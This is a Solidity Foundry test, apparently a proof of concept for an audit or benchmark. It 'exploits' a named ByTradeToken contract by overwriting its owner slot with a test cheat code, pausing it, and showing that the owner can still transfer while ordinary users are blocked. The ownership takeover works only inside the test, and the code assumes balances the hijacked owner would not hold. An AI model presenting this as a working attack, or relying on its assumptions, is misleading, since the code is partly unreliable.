pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IByTradeToken {
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function pause() external;
    function unpause() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function increaseAllowance(address spender, uint addedValue) external returns (bool);
    function decreaseAllowance(address spender, uint subtractedValue) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe8bd1CA97F8a0582335407B40B0576Df641fA94C;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use storage manipulation to become owner
        vm.label(TARGET, "ByTradeToken");

        // Create a regular user to demonstrate the restriction
        address regularUser = address(0x123);
        vm.label(regularUser, "RegularUser");

        // Get some tokens to the regular user for testing
        // First, we need to become owner to mint tokens
        // We'll do this in the exploit code
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Become the owner by overwriting storage slot
        // The owner is stored in slot 0 of Ownable contract (which is inherited)
        // ByTradeToken inherits from Ownable, so owner is at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we are now the owner
        IByTradeToken token = IByTradeToken(TARGET);
        require(token.owner() == attacker, "Failed to become owner");

        // Step 2: Call pause() as owner to pause the contract
        vm.prank(attacker);
        token.pause();

        // Step 3: Verify paused == true (oracle check)
        require(token.paused() == true, "Contract should be paused");

        // Step 4: Demonstrate owner can still transfer while paused
        // First, get some tokens to transfer
        // The owner already has tokens minted in constructor
        uint256 ownerBalance = token.balanceOf(attacker);
        require(ownerBalance > 0, "Owner should have tokens");

        // Create a recipient address
        address recipient = address(0x456);
        vm.label(recipient, "Recipient");

        // As owner, transfer tokens while paused (should succeed)
        vm.prank(attacker);
        token.transfer(recipient, 100 * 10**18);

        // Verify transfer succeeded
        uint256 recipientBalance = token.balanceOf(recipient);
        require(recipientBalance == 100 * 10**18, "Owner transfer should succeed while paused");

        // Step 5: Demonstrate regular user cannot transfer while paused
        // Give some tokens to a regular user first
        address regularUser = address(0x789);
        vm.label(regularUser, "RegularUser");

        // As owner, transfer tokens to regular user
        vm.prank(attacker);
        token.transfer(regularUser, 100 * 10**18);

        // Now try to have regular user transfer tokens while paused (should fail)
        vm.prank(regularUser);
        bool success;
        bytes memory returnData;

        (success, returnData) = address(token).call(
            abi.encodeWithSignature("transfer(address,uint256)", recipient, 50 * 10**18)
        );

        // This should fail because regular user is not owner and contract is paused
        require(!success, "Regular user should not be able to transfer while paused");

        // Final verification for the oracle
        assertEq(token.paused(), true, "Contract must be paused to demonstrate violation");
        assertEq(token.paused(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

